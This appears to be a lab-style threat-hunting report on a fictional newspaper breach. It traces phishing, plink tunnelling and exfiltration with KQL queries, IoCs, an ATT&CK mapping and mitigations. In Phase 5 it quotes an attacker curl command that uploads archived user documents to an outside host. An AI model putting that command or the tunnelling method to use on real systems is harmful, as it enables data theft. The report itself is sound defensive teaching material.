# Cloud Threat Hunting Report: Operation Valdorian Disruption
**Lead Incident Analyst:** Nathan Lee Jennings
**Platform Environment:** Azure Data Explorer (KQL Log Analytics)
**Target Organisation:** The Valdorian Times

---

## 1. Executive Summary
On January 22, 2024, an unauthorised, defamatory article targeting a mayoral candidate was fraudulently printed by The Valdorian Times due to a complete corporate infrastructure compromise. By crafting Kusto Query Language (KQL) routines, the incident response team traced the compromise back to a targeted phishing campaign on January 10, 2024. The threat actors established persistent Command and Control (C2) tunnels via `plink.exe`, moved laterally, modified editorial data, and compressed corporate files for exfiltration via a custom web portal.

---

## 2. Technical Indicators of Compromise (IoCs)
The investigation isolated the following malicious infrastructure and files:
*   **Phishing Sender Address:** `newspaper_jobs@gmail.com`
*   **Malicious Staging Domains:** `hire-recruit.com`, `promotionrecruit.com`
*   **Exfiltration Portal Endpoint:** `hirejob.com` (IP: `191.7.248.112`)
*   **Malicious Dropped Payloads:** `Valdorian_Times_Editorial_Offer_Letter.docx`, `hacktivist_manifesto.ps1`, `fakestory.docx`
*   **Attacker-Controlled C2 IPs:** `205.129.146.36`, `136.130.190.181`
*   **Compromised Internal Identities:** Sonia Gose (`10.10.0.3`), Nene Leaks (`10.10.0.17`), Ronnie McLovin (`10.10.0.19`), Lois Lan (`10.10.0.22`)
*   **Recovered Attacker Credential:** `$had0w thruthW!llS3tUfree`

---

## 3. Threat Hunting Timeline & Query Logic

### Phase 1: Initial Access & Phishing Campaign
The threat actor targeted 6 users at the organisation. IT Specialist Sonia Gose and Editorial Intern Ronnie McLovin executed the phishing payload on January 10, 2024.
```kusto
EmailEvents

| where Sender == "newspaper_jobs@gmail.com"
| project Timestamp, Sender, Recipient, Subject, Link
```
*Analysis Finding:* The email contained links pointing victims to `hire-recruit.com`, which directly dropped a malicious document masquerading as a job offer letter.

### Phase 2: Host Execution & Persistence
Upon opening the weaponised document, a malicious PowerShell script (`hacktivist_manifesto.ps1`) was unpacked to establish a hidden scheduled task.
```kusto
DeviceProcessEvents

| where ProcessCommandLine has "hacktivist_manifesto.ps1"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
```

### Phase 3: Command & Control (C2 Tunneling)
The attackers downloaded the utility `plink.exe` to bypass perimeter security, proxying RDP/SSH traffic over port 443 back to attacker IPs (`205.129.146.36` and `136.130.190.181`).
```kusto
DeviceNetworkEvents

| where InitiatingProcessFileName has "plink.exe" or RemoteIP in ("205.129.146.36", "136.130.190.181")
| project Timestamp, DeviceName, RemoteIP, RemotePort
```

### Phase 4: Data Manipulation (The Defamation Payload)
Using hands-on-keyboard access to Ronnie McLovin's machine (`10.10.0.19`), the attackers fetched `fakestory.docx` from `hire-recruit.com`, renamed it to `OpEdFinal_to_print.docx`, and spoofed an urgent email to the printing department (Clark Kent) to force publication.

### Phase 5: Data Exfiltration
Prior to closing operations, the threat actor scraped local files, desktop contents, and specific directory archives, bundling them into a compressed password-protected `.7z` container.
```kusto
DeviceProcessEvents

| where ProcessCommandLine has_all ("curl", "7z", "hirejob.com")
| project Timestamp, DeviceName, ProcessCommandLine
```
*Extracted Attacker Command:* `curl -F "file=@C:\Users\romclovin\Documents\*.7z" https://hirejob.com/exfil_processor/upload.php`

---

## 4. MITRE ATT&CK Mapping
*   **Initial Access:** Phishing: Malicious Link ([T1566.002](https://mitre.org))
*   **Execution:** Command and Scripting Interpreter: PowerShell ([T1059.001](https://mitre.org))
*   **Persistence:** Scheduled Task/Job: Scheduled Task ([T1053.005](https://mitre.org))
*   **Command and Control:** Protocol Tunneling ([T1572](https://mitre.org))
*   **Exfiltration:** Exfiltration Over Web Service ([T1567](https://mitre.org))

---

## 5. Defensive Remediation & Mitigations
1.  **Network Ingress/Egress Controls:** Implement strict URL filtering policies blocking transit to newly registered or unclassified domains such as `hire-recruit.com` and `hirejob.com`.
2.  **Application Whitelisting:** Enforce AppLocker/Software Restriction Policies to block administrative proxy utilities like `plink.exe` from executing in standard user space (`AppData/Local`).
3.  **Data Loss Prevention (DLP):** Deploy rules blocking outbound command-line web requests (`curl`/`powershell`) pushing archived `.7z` or `.zip` file patterns to unauthenticated web gateways.

